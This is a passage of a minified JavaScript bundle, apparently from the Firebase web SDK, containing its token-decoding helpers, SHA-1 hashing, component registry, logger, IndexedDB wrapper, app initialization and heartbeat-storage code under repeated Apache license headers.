 */const q1=function(t){let e={},n={},r={},i="";try{const s=t.split(".");e=Ul(Cd(s[0])||""),n=Ul(Cd(s[1])||""),i=s[2],r=n.d||{},delete n.d}catch{}return{header:e,claims:n,data:r,signature:i}},oj=function(t){const e=q1(t),n=e.claims;return!!n&&typeof n=="object"&&n.hasOwnProperty("iat")},aj=function(t){const e=q1(t).claims;return typeof e=="object"&&e.admin===!0};/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function or(t,e){return Object.prototype.hasOwnProperty.call(t,e)}function Uo(t,e){if(Object.prototype.hasOwnProperty.call(t,e))return t[e]}function Am(t){for(const e in t)if(Object.prototype.hasOwnProperty.call(t,e))return!1;return!0}function Sd(t,e,n){const r={};for(const i in t)Object.prototype.hasOwnProperty.call(t,i)&&(r[i]=e.call(n,t[i],i,t));return r}function Mi(t,e){if(t===e)return!0;const n=Object.keys(t),r=Object.keys(e);for(const i of n){if(!r.includes(i))return!1;const s=t[i],o=e[i];if(vw(s)&&vw(o)){if(!Mi(s,o))return!1}else if(s!==o)return!1}for(const i of r)if(!n.includes(i))return!1;return!0}function vw(t){return t!==null&&typeof t=="object"}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ra(t){const e=[];for(const[n,r]of Object.entries(t))Array.isArray(r)?r.forEach(i=>{e.push(encodeURIComponent(n)+"="+encodeURIComponent(i))}):e.push(encodeURIComponent(n)+"="+encodeURIComponent(r));return e.length?"&"+e.join("&"):""}function Qa(t){const e={};return t.replace(/^\?/,"").split("&").forEach(r=>{if(r){const[i,s]=r.split("=");e[decodeURIComponent(i)]=decodeURIComponent(s)}}),e}function Xa(t){const e=t.indexOf("?");if(!e)return"";const n=t.indexOf("#",e);return t.substring(e,n>0?n:void 0)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class lj{constructor(){this.chain_=[],this.buf_=[],this.W_=[],this.pad_=[],this.inbuf_=0,this.total_=0,this.blockSize=512/8,this.pad_[0]=128;for(let e=1;e<this.blockSize;++e)this.pad_[e]=0;this.reset()}reset(){this.chain_[0]=1732584193,this.chain_[1]=4023233417,this.chain_[2]=2562383102,this.chain_[3]=271733878,this.chain_[4]=3285377520,this.inbuf_=0,this.total_=0}compress_(e,n){n||(n=0);const r=this.W_;if(typeof e=="string")for(let f=0;f<16;f++)r[f]=e.charCodeAt(n)<<24|e.charCodeAt(n+1)<<16|e.charCodeAt(n+2)<<8|e.charCodeAt(n+3),n+=4;else for(let f=0;f<16;f++)r[f]=e[n]<<24|e[n+1]<<16|e[n+2]<<8|e[n+3],n+=4;for(let f=16;f<80;f++){const h=r[f-3]^r[f-8]^r[f-14]^r[f-16];r[f]=(h<<1|h>>>31)&4294967295}let i=this.chain_[0],s=this.chain_[1],o=this.chain_[2],a=this.chain_[3],c=this.chain_[4],u,p;for(let f=0;f<80;f++){f<40?f<20?(u=a^s&(o^a),p=1518500249):(u=s^o^a,p=1859775393):f<60?(u=s&o|a&(s|o),p=2400959708):(u=s^o^a,p=3395469782);const h=(i<<5|i>>>27)+u+c+p+r[f]&4294967295;c=a,a=o,o=(s<<30|s>>>2)&4294967295,s=i,i=h}this.chain_[0]=this.chain_[0]+i&4294967295,this.chain_[1]=this.chain_[1]+s&4294967295,this.chain_[2]=this.chain_[2]+o&4294967295,this.chain_[3]=this.chain_[3]+a&4294967295,this.chain_[4]=this.chain_[4]+c&4294967295}update(e,n){if(e==null)return;n===void 0&&(n=e.length);const r=n-this.blockSize;let i=0;const s=this.buf_;let o=this.inbuf_;for(;i<n;){if(o===0)for(;i<=r;)this.compress_(e,i),i+=this.blockSize;if(typeof e=="string"){for(;i<n;)if(s[o]=e.charCodeAt(i),++o,++i,o===this.blockSize){this.compress_(s),o=0;break}}else for(;i<n;)if(s[o]=e[i],++o,++i,o===this.blockSize){this.compress_(s),o=0;break}}this.inbuf_=o,this.total_+=n}digest(){const e=[];let n=this.total_*8;this.inbuf_<56?this.update(this.pad_,56-this.inbuf_):this.update(this.pad_,this.blockSize-(this.inbuf_-56));for(let i=this.blockSize-1;i>=56;i--)this.buf_[i]=n&255,n/=256;this.compress_(this.buf_);let r=0;for(let i=0;i<5;i++)for(let s=24;s>=0;s-=8)e[r]=this.chain_[i]>>s&255,++r;return e}}function cj(t,e){const n=new uj(t,e);return n.subscribe.bind(n)}class uj{constructor(e,n){this.observers=[],this.unsubscribes=[],this.observerCount=0,this.task=Promise.resolve(),this.finalized=!1,this.onNoObservers=n,this.task.then(()=>{e(this)}).catch(r=>{this.error(r)})}next(e){this.forEachObserver(n=>{n.next(e)})}error(e){this.forEachObserver(n=>{n.error(e)}),this.close(e)}complete(){this.forEachObserver(e=>{e.complete()}),this.close()}subscribe(e,n,r){let i;if(e===void 0&&n===void 0&&r===void 0)throw new Error("Missing Observer.");dj(e,["next","error","complete"])?i=e:i={next:e,error:n,complete:r},i.next===void 0&&(i.next=Zf),i.error===void 0&&(i.error=Zf),i.complete===void 0&&(i.complete=Zf);const s=this.unsubscribeOne.bind(this,this.observers.length);return this.finalized&&this.task.then(()=>{try{this.finalError?i.error(this.finalError):i.complete()}catch{}}),this.observers.push(i),s}unsubscribeOne(e){this.observers===void 0||this.observers[e]===void 0||(delete this.observers[e],this.observerCount-=1,this.observerCount===0&&this.onNoObservers!==void 0&&this.onNoObservers(this))}forEachObserver(e){if(!this.finalized)for(let n=0;n<this.observers.length;n++)this.sendOne(n,e)}sendOne(e,n){this.task.then(()=>{if(this.observers!==void 0&&this.observers[e]!==void 0)try{n(this.observers[e])}catch(r){typeof console<"u"&&console.error&&console.error(r)}})}close(e){this.finalized||(this.finalized=!0,e!==void 0&&(this.finalError=e),this.task.then(()=>{this.observers=void 0,this.onNoObservers=void 0}))}}function dj(t,e){if(typeof t!="object"||t===null)return!1;for(const n of e)if(n in t&&typeof t[n]=="function")return!0;return!1}function Zf(){}function Ch(t,e){return`${t} failed: ${e} argument `}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const hj=function(t){const e=[];let n=0;for(let r=0;r<t.length;r++){let i=t.charCodeAt(r);if(i>=55296&&i<=56319){const s=i-55296;r++,B(r<t.length,"Surrogate pair missing trail surrogate.");const o=t.charCodeAt(r)-56320;i=65536+(s<<10)+o}i<128?e[n++]=i:i<2048?(e[n++]=i>>6|192,e[n++]=i&63|128):i<65536?(e[n++]=i>>12|224,e[n++]=i>>6&63|128,e[n++]=i&63|128):(e[n++]=i>>18|240,e[n++]=i>>12&63|128,e[n++]=i>>6&63|128,e[n++]=i&63|128)}return e},Sh=function(t){let e=0;for(let n=0;n<t.length;n++){const r=t.charCodeAt(n);r<128?e++:r<2048?e+=2:r>=55296&&r<=56319?(e+=4,n++):e+=3}return e};/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function ft(t){return t&&t._delegate?t._delegate:t}class Rr{constructor(e,n,r){this.name=e,this.instanceFactory=n,this.type=r,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}setInstantiationMode(e){return this.instantiationMode=e,this}setMultipleInstances(e){return this.multipleInstances=e,this}setServiceProps(e){return this.serviceProps=e,this}setInstanceCreatedCallback(e){return this.onInstanceCreated=e,this}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const as="[DEFAULT]";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let fj=class{constructor(e,n){this.name=e,this.container=n,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.instancesOptions=new Map,this.onInitCallbacks=new Map}get(e){const n=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(n)){const r=new dc;if(this.instancesDeferred.set(n,r),this.isInitialized(n)||this.shouldAutoInitialize())try{const i=this.getOrInitializeService({instanceIdentifier:n});i&&r.resolve(i)}catch{}}return this.instancesDeferred.get(n).promise}getImmediate(e){var n;const r=this.normalizeInstanceIdentifier(e==null?void 0:e.identifier),i=(n=e==null?void 0:e.optional)!==null&&n!==void 0?n:!1;if(this.isInitialized(r)||this.shouldAutoInitialize())try{return this.getOrInitializeService({instanceIdentifier:r})}catch(s){if(i)return null;throw s}else{if(i)return null;throw Error(`Service ${this.name} is not available`)}}getComponent(){return this.component}setComponent(e){if(e.name!==this.name)throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);if(this.component)throw Error(`Component for ${this.name} has already been provided`);if(this.component=e,!!this.shouldAutoInitialize()){if(mj(e))try{this.getOrInitializeService({instanceIdentifier:as})}catch{}for(const[n,r]of this.instancesDeferred.entries()){const i=this.normalizeInstanceIdentifier(n);try{const s=this.getOrInitializeService({instanceIdentifier:i});r.resolve(s)}catch{}}}}clearInstance(e=as){this.instancesDeferred.delete(e),this.instancesOptions.delete(e),this.instances.delete(e)}async delete(){const e=Array.from(this.instances.values());await Promise.all([...e.filter(n=>"INTERNAL"in n).map(n=>n.INTERNAL.delete()),...e.filter(n=>"_delete"in n).map(n=>n._delete())])}isComponentSet(){return this.component!=null}isInitialized(e=as){return this.instances.has(e)}getOptions(e=as){return this.instancesOptions.get(e)||{}}initialize(e={}){const{options:n={}}=e,r=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(r))throw Error(`${this.name}(${r}) has already been initialized`);if(!this.isComponentSet())throw Error(`Component ${this.name} has not been registered yet`);const i=this.getOrInitializeService({instanceIdentifier:r,options:n});for(const[s,o]of this.instancesDeferred.entries()){const a=this.normalizeInstanceIdentifier(s);r===a&&o.resolve(i)}return i}onInit(e,n){var r;const i=this.normalizeInstanceIdentifier(n),s=(r=this.onInitCallbacks.get(i))!==null&&r!==void 0?r:new Set;s.add(e),this.onInitCallbacks.set(i,s);const o=this.instances.get(i);return o&&e(o,i),()=>{s.delete(e)}}invokeOnInitCallbacks(e,n){const r=this.onInitCallbacks.get(n);if(r)for(const i of r)try{i(e,n)}catch{}}getOrInitializeService({instanceIdentifier:e,options:n={}}){let r=this.instances.get(e);if(!r&&this.component&&(r=this.component.instanceFactory(this.container,{instanceIdentifier:pj(e),options:n}),this.instances.set(e,r),this.instancesOptions.set(e,n),this.invokeOnInitCallbacks(r,e),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,e,r)}catch{}return r||null}normalizeInstanceIdentifier(e=as){return this.component?this.component.multipleInstances?e:as:e}shouldAutoInitialize(){return!!this.component&&this.component.instantiationMode!=="EXPLICIT"}};function pj(t){return t===as?void 0:t}function mj(t){return t.instantiationMode==="EAGER"}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class gj{constructor(e){this.name=e,this.providers=new Map}addComponent(e){const n=this.getProvider(e.name);if(n.isComponentSet())throw new Error(`Component ${e.name} has already been registered with ${this.name}`);n.setComponent(e)}addOrOverwriteComponent(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)}getProvider(e){if(this.providers.has(e))return this.providers.get(e);const n=new fj(e,this);return this.providers.set(e,n),n}getProviders(){return Array.from(this.providers.values())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var _e;(function(t){t[t.DEBUG=0]="DEBUG",t[t.VERBOSE=1]="VERBOSE",t[t.INFO=2]="INFO",t[t.WARN=3]="WARN",t[t.ERROR=4]="ERROR",t[t.SILENT=5]="SILENT"})(_e||(_e={}));const vj={debug:_e.DEBUG,verbose:_e.VERBOSE,info:_e.INFO,warn:_e.WARN,error:_e.ERROR,silent:_e.SILENT},yj=_e.INFO,_j={[_e.DEBUG]:"log",[_e.VERBOSE]:"log",[_e.INFO]:"info",[_e.WARN]:"warn",[_e.ERROR]:"error"},wj=(t,e,...n)=>{if(e<t.logLevel)return;const r=new Date().toISOString(),i=_j[e];if(i)console[i](`[${r}]  ${t.name}:`,...n);else throw new Error(`Attempted to log a message with an invalid logType (value: ${e})`)};class bh{constructor(e){this.name=e,this._logLevel=yj,this._logHandler=wj,this._userLogHandler=null}get logLevel(){return this._logLevel}set logLevel(e){if(!(e in _e))throw new TypeError(`Invalid value "${e}" assigned to \`logLevel\``);this._logLevel=e}setLogLevel(e){this._logLevel=typeof e=="string"?vj[e]:e}get logHandler(){return this._logHandler}set logHandler(e){if(typeof e!="function")throw new TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e}get userLogHandler(){return this._userLogHandler}set userLogHandler(e){this._userLogHandler=e}debug(...e){this._userLogHandler&&this._userLogHandler(this,_e.DEBUG,...e),this._logHandler(this,_e.DEBUG,...e)}log(...e){this._userLogHandler&&this._userLogHandler(this,_e.VERBOSE,...e),this._logHandler(this,_e.VERBOSE,...e)}info(...e){this._userLogHandler&&this._userLogHandler(this,_e.INFO,...e),this._logHandler(this,_e.INFO,...e)}warn(...e){this._userLogHandler&&this._userLogHandler(this,_e.WARN,...e),this._logHandler(this,_e.WARN,...e)}error(...e){this._userLogHandler&&this._userLogHandler(this,_e.ERROR,...e),this._logHandler(this,_e.ERROR,...e)}}const xj=(t,e)=>e.some(n=>t instanceof n);let yw,_w;function Ej(){return yw||(yw=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction])}function Cj(){return _w||(_w=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])}const Y1=new WeakMap,Om=new WeakMap,Q1=new WeakMap,ep=new WeakMap,kv=new WeakMap;function Sj(t){const e=new Promise((n,r)=>{const i=()=>{t.removeEventListener("success",s),t.removeEventListener("error",o)},s=()=>{n(bi(t.result)),i()},o=()=>{r(t.error),i()};t.addEventListener("success",s),t.addEventListener("error",o)});return e.then(n=>{n instanceof IDBCursor&&Y1.set(n,t)}).catch(()=>{}),kv.set(e,t),e}function bj(t){if(Om.has(t))return;const e=new Promise((n,r)=>{const i=()=>{t.removeEventListener("complete",s),t.removeEventListener("error",o),t.removeEventListener("abort",o)},s=()=>{n(),i()},o=()=>{r(t.error||new DOMException("AbortError","AbortError")),i()};t.addEventListener("complete",s),t.addEventListener("error",o),t.addEventListener("abort",o)});Om.set(t,e)}let Dm={get(t,e,n){if(t instanceof IDBTransaction){if(e==="done")return Om.get(t);if(e==="objectStoreNames")return t.objectStoreNames||Q1.get(t);if(e==="store")return n.objectStoreNames[1]?void 0:n.objectStore(n.objectStoreNames[0])}return bi(t[e])},set(t,e,n){return t[e]=n,!0},has(t,e){return t instanceof IDBTransaction&&(e==="done"||e==="store")?!0:e in t}};function Tj(t){Dm=t(Dm)}function Ij(t){return t===IDBDatabase.prototype.transaction&&!("objectStoreNames"in IDBTransaction.prototype)?function(e,...n){const r=t.call(tp(this),e,...n);return Q1.set(r,e.sort?e.sort():[e]),bi(r)}:Cj().includes(t)?function(...e){return t.apply(tp(this),e),bi(Y1.get(this))}:function(...e){return bi(t.apply(tp(this),e))}}function Nj(t){return typeof t=="function"?Ij(t):(t instanceof IDBTransaction&&bj(t),xj(t,Ej())?new Proxy(t,Dm):t)}function bi(t){if(t instanceof IDBRequest)return Sj(t);if(ep.has(t))return ep.get(t);const e=Nj(t);return e!==t&&(ep.set(t,e),kv.set(e,t)),e}const tp=t=>kv.get(t);function kj(t,e,{blocked:n,upgrade:r,blocking:i,terminated:s}={}){const o=indexedDB.open(t,e),a=bi(o);return r&&o.addEventListener("upgradeneeded",c=>{r(bi(o.result),c.oldVersion,c.newVersion,bi(o.transaction),c)}),n&&o.addEventListener("blocked",c=>n(c.oldVersion,c.newVersion,c)),a.then(c=>{s&&c.addEventListener("close",()=>s()),i&&c.addEventListener("versionchange",u=>i(u.oldVersion,u.newVersion,u))}).catch(()=>{}),a}const Pj=["get","getKey","getAll","getAllKeys","count"],Rj=["put","add","delete","clear"],np=new Map;function ww(t,e){if(!(t instanceof IDBDatabase&&!(e in t)&&typeof e=="string"))return;if(np.get(e))return np.get(e);const n=e.replace(/FromIndex$/,""),r=e!==n,i=Rj.includes(n);if(!(n in(r?IDBIndex:IDBObjectStore).prototype)||!(i||Pj.includes(n)))return;const s=async function(o,...a){const c=this.transaction(o,i?"readwrite":"readonly");let u=c.store;return r&&(u=u.index(a.shift())),(await Promise.all([u[n](...a),i&&c.done]))[0]};return np.set(e,s),s}Tj(t=>({...t,get:(e,n,r)=>ww(e,n)||t.get(e,n,r),has:(e,n)=>!!ww(e,n)||t.has(e,n)}));/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Aj{constructor(e){this.container=e}getPlatformInfoString(){return this.container.getProviders().map(n=>{if(Oj(n)){const r=n.getImmediate();return`${r.library}/${r.version}`}else return null}).filter(n=>n).join(" ")}}function Oj(t){const e=t.getComponent();return(e==null?void 0:e.type)==="VERSION"}const jm="@firebase/app",xw="0.11.4";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Ar=new bh("@firebase/app"),Dj="@firebase/app-compat",jj="@firebase/analytics-compat",Mj="@firebase/analytics",Lj="@firebase/app-check-compat",Fj="@firebase/app-check",Uj="@firebase/auth",$j="@firebase/auth-compat",zj="@firebase/database",Bj="@firebase/data-connect",Vj="@firebase/database-compat",Hj="@firebase/functions",Wj="@firebase/functions-compat",Kj="@firebase/installations",Gj="@firebase/installations-compat",qj="@firebase/messaging",Yj="@firebase/messaging-compat",Qj="@firebase/performance",Xj="@firebase/performance-compat",Jj="@firebase/remote-config",Zj="@firebase/remote-config-compat",eM="@firebase/storage",tM="@firebase/storage-compat",nM="@firebase/firestore",rM="@firebase/vertexai",iM="@firebase/firestore-compat",sM="firebase",oM="11.6.0";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Mm="[DEFAULT]",aM={[jm]:"fire-core",[Dj]:"fire-core-compat",[Mj]:"fire-analytics",[jj]:"fire-analytics-compat",[Fj]:"fire-app-check",[Lj]:"fire-app-check-compat",[Uj]:"fire-auth",[$j]:"fire-auth-compat",[zj]:"fire-rtdb",[Bj]:"fire-data-connect",[Vj]:"fire-rtdb-compat",[Hj]:"fire-fn",[Wj]:"fire-fn-compat",[Kj]:"fire-iid",[Gj]:"fire-iid-compat",[qj]:"fire-fcm",[Yj]:"fire-fcm-compat",[Qj]:"fire-perf",[Xj]:"fire-perf-compat",[Jj]:"fire-rc",[Zj]:"fire-rc-compat",[eM]:"fire-gcs",[tM]:"fire-gcs-compat",[nM]:"fire-fst",[iM]:"fire-fst-compat",[rM]:"fire-vertex","fire-js":"fire-js",[sM]:"fire-js-all"};/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const bd=new Map,lM=new Map,Lm=new Map;function Ew(t,e){try{t.container.addComponent(e)}catch(n){Ar.debug(`Component ${e.name} failed to register with FirebaseApp ${t.name}`,n)}}function Li(t){const e=t.name;if(Lm.has(e))return Ar.debug(`There were multiple attempts to register component ${e}.`),!1;Lm.set(e,t);for(const n of bd.values())Ew(n,t);for(const n of lM.values())Ew(n,t);return!0}function fc(t,e){const n=t.container.getProvider("heartbeat").getImmediate({optional:!0});return n&&n.triggerHeartbeat(),t.container.getProvider(e)}function Ut(t){return t==null?!1:t.settings!==void 0}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const cM={"no-app":"No Firebase App '{$appName}' has been created - call initializeApp() first","bad-app-name":"Illegal App name: '{$appName}'","duplicate-app":"Firebase App named '{$appName}' already exists with different options or config","app-deleted":"Firebase App named '{$appName}' already deleted","server-app-deleted":"Firebase Server App has been deleted","no-options":"Need to provide options, when not being deployed to hosting via source.","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance.","invalid-log-argument":"First argument to `onLog` must be null or a function.","idb-open":"Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.","idb-get":"Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.","idb-set":"Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.","idb-delete":"Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}.","finalization-registry-not-supported":"FirebaseServerApp deleteOnDeref field defined but the JS runtime does not support FinalizationRegistry.","invalid-server-app-environment":"FirebaseServerApp is not for use in browser environments."},Ti=new hc("app","Firebase",cM);/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class uM{constructor(e,n,r){this._isDeleted=!1,this._options=Object.assign({},e),this._config=Object.assign({},n),this._name=n.name,this._automaticDataCollectionEnabled=n.automaticDataCollectionEnabled,this._container=r,this.container.addComponent(new Rr("app",()=>this,"PUBLIC"))}get automaticDataCollectionEnabled(){return this.checkDestroyed(),this._automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this.checkDestroyed(),this._automaticDataCollectionEnabled=e}get name(){return this.checkDestroyed(),this._name}get options(){return this.checkDestroyed(),this._options}get config(){return this.checkDestroyed(),this._config}get container(){return this._container}get isDeleted(){return this._isDeleted}set isDeleted(e){this._isDeleted=e}checkDestroyed(){if(this.isDeleted)throw Ti.create("app-deleted",{appName:this._name})}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Qi=oM;function X1(t,e={}){let n=t;typeof e!="object"&&(e={name:e});const r=Object.assign({name:Mm,automaticDataCollectionEnabled:!1},e),i=r.name;if(typeof i!="string"||!i)throw Ti.create("bad-app-name",{appName:String(i)});if(n||(n=H1()),!n)throw Ti.create("no-options");const s=bd.get(i);if(s){if(Mi(n,s.options)&&Mi(r,s.config))return s;throw Ti.create("duplicate-app",{appName:i})}const o=new gj(i);for(const c of Lm.values())o.addComponent(c);const a=new uM(n,r,o);return bd.set(i,a),a}function Th(t=Mm){const e=bd.get(t);if(!e&&t===Mm&&H1())return X1();if(!e)throw Ti.create("no-app",{appName:t});return e}function mn(t,e,n){var r;let i=(r=aM[t])!==null&&r!==void 0?r:t;n&&(i+=`-${n}`);const s=i.match(/\s|\//),o=e.match(/\s|\//);if(s||o){const a=[`Unable to register library "${i}" with version "${e}":`];s&&a.push(`library name "${i}" contains illegal characters (whitespace or "/")`),s&&o&&a.push("and"),o&&a.push(`version name "${e}" contains illegal characters (whitespace or "/")`),Ar.warn(a.join(" "));return}Li(new Rr(`${i}-version`,()=>({library:i,version:e}),"VERSION"))}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const dM="firebase-heartbeat-database",hM=1,$l="firebase-heartbeat-store";let rp=null;function J1(){return rp||(rp=kj(dM,hM,{upgrade:(t,e)=>{switch(e){case 0:try{t.createObjectStore($l)}catch(n){console.warn(n)}}}}).catch(t=>{throw Ti.create("idb-open",{originalErrorMessage:t.message})})),rp}async function fM(t){try{const n=(await J1()).transaction($l),r=await n.objectStore($l).get(Z1(t));return await n.done,r}catch(e){if(e instanceof sr)Ar.warn(e.message);else{const n=Ti.create("idb-get",{originalErrorMessage:e==null?void 0:e.message});Ar.warn(n.message)}}}async function Cw(t,e){try{const r=(await J1()).transaction($l,"readwrite");await r.objectStore($l).put(e,Z1(t)),await r.done}catch(n){if(n instanceof sr)Ar.warn(n.message);else{const r=Ti.create("idb-set",{originalErrorMessage:n==null?void 0:n.message});Ar.warn(r.message)}}}function Z1(t){return`${t.name}!${t.options.appId}`}/**
 * @license
